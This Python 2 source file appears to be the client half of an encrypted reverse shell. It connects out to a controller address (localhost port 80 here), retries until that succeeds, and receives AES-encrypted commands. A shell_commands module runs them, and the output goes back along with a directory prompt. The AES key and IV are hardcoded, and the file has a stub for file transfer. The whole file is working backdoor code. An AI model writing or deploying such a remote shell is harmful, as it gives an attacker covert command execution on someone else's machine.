#!/usr/bin/env python2

import sys
import socket
import subprocess
import Queue
import os
import threading
import time
import shell_commands
from shell_config import *
from Crypto.Cipher import AES
import base64

aesobj = AES.new('brvty5b6BB7y56b754BBERBT', AES.MODE_CFB, 'odiryvt93y489yrv')
														#Cryptography stuff
EncodeAES = lambda  s: base64.b64encode(aesobj.encrypt(s))
DecodeAES = lambda  e: aesobj.decrypt(base64.b64decode(e))

marker = chr(255)

def connect():
    global comm_socket
    comm_socket = socket.socket()
    comm_socket.connect(("127.0.0.1", 80))
    comm_socket.sendall(EncodeAES("\n"+os.getcwd()+">"+marker))

while True:
    try:
        connect()
        print "worked"
        break
    except:
        print "Can't connect! Trying again in " + str(sleeptime) + " seconds..."
        time.sleep(sleeptime)


output_queue = Queue.Queue()

class MessageWorker:
	def __init__(self, data_prefix):
		self.data_prefix = data_prefix
		self.input_queue = Queue.Queue()
		
	def put(self, data):
		self.input_queue.put(data)
		
	def send(self, data):
		output_queue.put(self.data_prefix+data+marker)
		
	def run(self):
		pass
		
class UserInputWorker(MessageWorker):

	def run(self):
		while True:
			print "trying to get data!"
			data = self.input_queue.get()
			
			output = shell_commands.handle_command(data)
			output += "\n"+os.getcwd()+">> "
			self.send(output)
			
class FileTransferWorker(MessageWorker):

	def run(self):
		pass
			
class TransmitWorker(MessageWorker): # Pseudo-worker to send data to shell
	def run(self):
		while True:
			comm_socket.sendall(EncodeAES(output_queue.get()))	
		
workers = []
user_input_worker = UserInputWorker(chr(1))
transmit_worker = TransmitWorker(chr(0)) # Create workers
workers.append(user_input_worker)
workers.append(transmit_worker)

for worker in workers: # Start workers
	t = threading.Thread(target=worker.run)
	t.daemon = True
	t.start()

while True:
	data = ""
	while not data.endswith(marker):
		data += DecodeAES(comm_socket.recv(4096))
	if not data: break
	data = data[:-1] # Get data from shell and remove marker

	for worker in workers:
		if worker.data_prefix == data[0]: # Put data on correct worker's queue
			worker.put(data[1:])
			break
